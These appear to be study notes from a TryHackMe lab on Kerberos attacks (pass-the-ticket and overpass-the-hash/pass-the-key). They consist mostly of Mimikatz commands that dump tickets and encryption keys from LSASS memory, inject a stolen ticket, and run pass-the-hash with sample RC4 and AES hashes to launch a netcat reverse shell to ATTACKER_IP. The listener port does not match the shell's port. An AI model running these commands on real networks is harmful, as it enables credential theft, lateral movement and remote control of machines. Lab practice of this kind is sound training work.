# Alternate Authentication - Kerberos
## Kerberos Authentication
### Pass-the-Ticket
- Extract Kerberos tickets and session keys from LSASS memory using Mimikatz
- Process requires SYSTEM privileges on the target machine

`mimikatz # privilege::debug`  
`mimikatz # sekurlsa::tickets /export`  

Mimikatz can extract TGT or TGS available from the memory of LSASS process.
- Interested in TGTs as they can be used to request access to any services the user is allowed to access
- TGSs are only good for specific service
- Extracting TGTs will require admin credentials
- Extracting TGSs can be done with low privileged accounts

Inject ticket into current session:  
`mimikatz # kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi`

Check if tickets are correctly injected:  
`za\bob.jenkins@THMJMP2 C:\> klist`  

### Overpass-the-Hash/Pass-the-Key
- Applied to Kerberos networks

When a user requests a TGT, they send a timestamp encrypted with an encryption key derived from their password.
- Algorithm used to derive key can either be DES, RC4, AES128 or AES256
- If we have those keys, we can ask KDC for a TGT without requiring the password (hence the name pass-the-key)

Obtain Kerberos encryption keys from memory by using Mimikatz:  
`mimikatz # privilege::debug`  
`mimikatz # sekurlsa::ekeys`

Depending on the available keys, we can run the following commands on Mimikatz to get a reverse shell via Pass-the-Key:  
- RC4 Hash  

`mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
`
- AES128 Hash  

`mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes128:b65ea8151f13a31d01377f5934bf3883 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
`

When using RC4, they key will be equal to NTLM hash of user:
- Extract NTLM hash, we can request a TGT as long as RC4 is enabled (Overpass-the-Hash)

Run a reverse shell on attacking machine:  
- `nc -lvp 5555`
